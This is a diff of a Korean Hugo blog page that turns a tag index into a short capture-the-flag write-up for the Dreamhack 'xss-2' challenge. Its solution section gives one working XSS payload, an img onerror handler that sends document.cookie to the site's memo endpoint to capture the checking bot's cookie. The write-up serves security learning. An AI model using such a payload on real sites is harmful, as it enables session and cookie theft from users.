@@ -5,26 +5,34 @@
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <meta name="generator" content="Hugo 0.79.0" />
 
-  <title>Tags &middot; SooHo&#39;s Blog</title>
+  <title>[dreamhack] xss-2 &middot; SooHo&#39;s Blog</title>
 
   <meta name="description" content="" />
 
   
 
-<meta itemprop="name" content="Tags">
-<meta itemprop="description" content="">
+<meta itemprop="name" content="[dreamhack] xss-2">
+<meta itemprop="description" content="[문제]  여러 기능과 입력받은 URL을 확인하는 봇이 구현된 서비스입니다. XSS 취약점을 이용해 플래그를 획득하세요.">
+<meta itemprop="datePublished" content="2021-10-05T22:28:53+09:00" />
+<meta itemprop="dateModified" content="2021-10-05T22:28:53+09:00" />
+<meta itemprop="wordCount" content="23">
+
+
+
+<meta itemprop="keywords" content="XSS," />
 
 
 <meta name="twitter:card" content="summary"/>
-<meta name="twitter:title" content="Tags"/>
-<meta name="twitter:description" content=""/>
+<meta name="twitter:title" content="[dreamhack] xss-2"/>
+<meta name="twitter:description" content="[문제]  여러 기능과 입력받은 URL을 확인하는 봇이 구현된 서비스입니다. XSS 취약점을 이용해 플래그를 획득하세요."/>
 
 
-<meta property="og:title" content="Tags" />
-<meta property="og:description" content="" />
-<meta property="og:type" content="website" />
-<meta property="og:url" content="https://appealso.github.io/tags/" />
-<meta property="og:updated_time" content="2021-10-05T22:28:53+09:00" />
+<meta property="og:title" content="[dreamhack] xss-2" />
+<meta property="og:description" content="[문제]  여러 기능과 입력받은 URL을 확인하는 봇이 구현된 서비스입니다. XSS 취약점을 이용해 플래그를 획득하세요." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://appealso.github.io/posts/ctf03/" />
+<meta property="article:published_time" content="2021-10-05T22:28:53+09:00" />
+<meta property="article:modified_time" content="2021-10-05T22:28:53+09:00" />
 
 
 
@@ -57,23 +65,58 @@
     },
     {
       "@type": "WebPage",
-      "@id": "https://appealso.github.io/tags/#webpage",
-      "url": "https://appealso.github.io/tags/",
-      "name": "Tags",
+      "@id": "https://appealso.github.io/posts/ctf03/#webpage",
+      "url": "https://appealso.github.io/posts/ctf03/",
+      "name": "[dreamhack] xss-2",
       "isPartOf": {
         "@id": "https://appealso.github.io#website"
       },
       "about": {
          "@id": "https://appealso.github.io#author"
       },
+      "datePublished": "2021-10-05T22:28:53+09:00",
       "dateModified": "2021-10-05T22:28:53+09:00",
-      "description": ,
+      "description": "[문제]  여러 기능과 입력받은 URL을 확인하는 봇이 구현된 서비스입니다. XSS 취약점을 이용해 플래그를 획득하세요.",
       "inLanguage": "ko",
       "potentialAction": [
         {
           "@type": "ReadAction",
           "target": [
-            "https://appealso.github.io/tags/"
+            "https://appealso.github.io/posts/ctf03/"
+          ]
+        }
+      ]
+    },
+    {
+      "@type": "Article",
+      "isPartOf": {
+        "@id": "https://appealso.github.io/posts/ctf03/#webpage"
+      },
+      "mainEntityOfPage": {
+        "@id": "https://appealso.github.io/posts/ctf03/#webpage"
+      },
+      "headline": "[dreamhack] xss-2",
+      "datePublished": "2021-10-05T22:28:53+09:00",
+      "dateModified": "2021-10-05T22:28:53+09:00",
+      "publisher": {
+        "@id": "https://appealso.github.io#author"
+      },
+      "keywords": [
+        "XSS"
+      ],
+      "articleSection": [
+      ],
+      "inLanguage": "ko",
+      "author": {
+        "@type": "Person",
+        "name":  null 
+      },
+      "potentialAction": [
+        {
+          "@type": "CommentAction",
+          "name": "Comment",
+          "target": [
+            "https://appealso.github.io/posts/ctf03/#comments"
           ]
         }
       ]
@@ -151,7 +194,6 @@
   <link rel="shortcut icon" href="/favicon.png">
 
   
-  <link href="https://appealso.github.io/tags/index.xml" rel="alternate" type="application/rss+xml" title="SooHo's Blog" />
   </head>
 <body>
   <aside class="sidebar">
@@ -211,85 +253,95 @@
 
 
   <main class="content container">
-  <ul class="posts">
-  <h1>Tag: Tags</h1>
+  <div class="post">
+  <h1 class="title">[dreamhack] xss-2</h1>
+  
+
+  <div class="post-date">
+    <time datetime="2021-10-05T22:28:53&#43;0900">Oct 5, 2021</time> <span class="readtime">&middot; 1 min read</span>
+  </div>
+
+  <div>
+  <h3 id="문제">[문제]</h3>
+<blockquote>
+<p>여러 기능과 입력받은 URL을 확인하는 봇이 구현된 서비스입니다.
+XSS 취약점을 이용해 플래그를 획득하세요. 플래그는 flag.txt, FLAG 변수에 있습니다.</p>
+</blockquote>
+<h3 id="해결법">[해결법]</h3>
+<blockquote>
+<p>&lt;img src=&lsquo;x&rsquo; onerror=&lsquo;location.href=&quot;/memo?memo=&quot;+document.cookie;'&gt;</p>
+</blockquote>
+
+  </div>
+
+  
+<div>
+  <ul class="tags">
   <li>
-    <div class="flex">
-      <a href="https://appealso.github.io/tags/xss/" class="truncate">XSS</a>
-      <time class="nowrap" datetime="2021-10-05T22:28:53&#43;0900">Oct 5, 2021</time>
-    </div>
-  </li><li>
-    <div class="flex">
-      <a href="https://appealso.github.io/tags/lfi/" class="truncate">LFI</a>
-      <time class="nowrap" datetime="2021-10-05T21:46:26&#43;0900">Oct 5, 2021</time>
-    </div>
-  </li><li>
-    <div class="flex">
-      <a href="https://appealso.github.io/tags/ssrf/" class="truncate">ssrf</a>
-      <time class="nowrap" datetime="2021-10-05T21:40:18&#43;0900">Oct 5, 2021</time>
-    </div>
-  </li><li>
-    <div class="flex">
-      <a href="https://appealso.github.io/tags/algorithm/" class="truncate">algorithm</a>
-      <time class="nowrap" datetime="2021-08-29T14:26:07&#43;0900">Aug 29, 2021</time>
-    </div>
-  </li><li>
-    <div class="flex">
-      <a href="https://appealso.github.io/tags/stack/" class="truncate">stack</a>
-      <time class="nowrap" datetime="2021-08-29T14:26:07&#43;0900">Aug 29, 2021</time>
-    </div>
-  </li><li>
-    <div class="flex">
-      <a href="https://appealso.github.io/tags/backtracking/" class="truncate">backtracking</a>
-      <time class="nowrap" datetime="2021-08-21T11:27:56&#43;0900">Aug 21, 2021</time>
-    </div>
-  </li><li>
-    <div class="flex">
-      <a href="https://appealso.github.io/tags/%EC%9E%AC%EA%B7%80/" class="truncate">재귀</a>
-      <time class="nowrap" datetime="2021-08-16T11:57:47&#43;0900">Aug 16, 2021</time>
-    </div>
-  </li><li>
-    <div class="flex">
-      <a href="https://appealso.github.io/tags/docker/" class="truncate">docker</a>
-      <time class="nowrap" datetime="2021-04-24T22:06:22&#43;0900">Apr 24, 2021</time>
-    </div>
-  </li><li>
-    <div class="flex">
-      <a href="https://appealso.github.io/tags/github/" class="truncate">github</a>
-      <time class="nowrap" datetime="2021-04-24T22:06:22&#43;0900">Apr 24, 2021</time>
-    </div>
-  </li><li>
-    <div class="flex">
-      <a href="https://appealso.github.io/tags/jenkins/" class="truncate">jenkins</a>
-      <time class="nowrap" datetime="2021-04-24T22:06:22&#43;0900">Apr 24, 2021</time>
-    </div>
-  </li><li>
-    <div class="flex">
-      <a href="https://appealso.github.io/tags/git/" class="truncate">git</a>
-      <time class="nowrap" datetime="2021-04-24T18:51:40&#43;0900">Apr 24, 2021</time>
-    </div>
-  </li><li>
-    <div class="flex">
-      <a href="https://appealso.github.io/tags/github.io/" class="truncate">github.io</a>
-      <time class="nowrap" datetime="2020-12-21T20:45:37&#43;0900">Dec 21, 2020</time>
-    </div>
-  </li><li>
-    <div class="flex">
-      <a href="https://appealso.github.io/tags/hugo/" class="truncate">hugo</a>
-      <time class="nowrap" datetime="2020-12-21T20:45:37&#43;0900">Dec 21, 2020</time>
-    </div>
-  </li><li>
-    <div class="flex">
-      <a href="https://appealso.github.io/tags/hugo-theme/" class="truncate">hugo Theme</a>
-      <time class="nowrap" datetime="2020-12-21T20:45:37&#43;0900">Dec 21, 2020</time>
-    </div>
-  </li><li>
-    <div class="flex">
-      <a href="https://appealso.github.io/tags/markdown/" class="truncate">Markdown</a>
-      <time class="nowrap" datetime="2020-12-20T20:19:13&#43;0900">Dec 20, 2020</time>
-    </div>
+    <a href="https://appealso.github.io/tags/xss/" class="tag-link">XSS</a>
   </li>
-</ul>
+  </ul>
+</div>
+
+
+
+  <div class="share-buttons">
+  <a class="twitter-share-button"
+     href="#"
+     title="Share on Twitter"
+     data-url="https://appealso.github.io/posts/ctf03/"
+     data-text="[dreamhack] xss-2"><i class="fab fa-twitter"></i></a>
+
+  <a class="linkedin-share-button"
+     href="#"
+     title="Share on LinkedIn"
+     data-url="https://appealso.github.io/posts/ctf03/"
+     data-text="[dreamhack] xss-2"><i class="fab fa-linkedin-in"></i></a>
+
+  <a class="facebook-share-button"
+     href="#"
+     title="Share on Facebook"
+     data-url="https://appealso.github.io/posts/ctf03/"
+     data-text="[dreamhack] xss-2"><i class="fab fa-facebook"></i></a>
+
+  <a class="telegram-share-button"
+     href="#"
+     title="Share on Telegram"
+     data-url="https://appealso.github.io/posts/ctf03/"
+     data-text="[dreamhack] xss-2"><i class="fab fa-telegram"></i></a>
+
+  <a class="pinterest-share-button"
+     href="#"
+     title="Share on Pinterest"
+     data-url="https://appealso.github.io/posts/ctf03/"
+     data-text="[dreamhack] xss-2"><i class="fab fa-pinterest"></i></a>
+</div>
+
+
+  <div class="comments">
+    <h2>Comments</h2>
+    <div id="disqus_thread"></div>
+<script type="application/javascript">
+    var disqus_config = function () {
+    
+    
+    
+    };
+    (function() {
+        if (["localhost", "127.0.0.1"].indexOf(window.location.hostname) != -1) {
+            document.getElementById('disqus_thread').innerHTML = 'Disqus comments not available by default when the website is previewed locally.';
+            return;
+        }
+        var d = document, s = d.createElement('script'); s.async = true;
+        s.src = '//' + "appealso-github-io" + '.disqus.com/embed.js';
+        s.setAttribute('data-timestamp', +new Date());
+        (d.head || d.body).appendChild(s);
+    })();
+</script>
+<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+<a href="https://disqus.com" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>
+  </div>
+</div>
   </main>
 
   <footer>
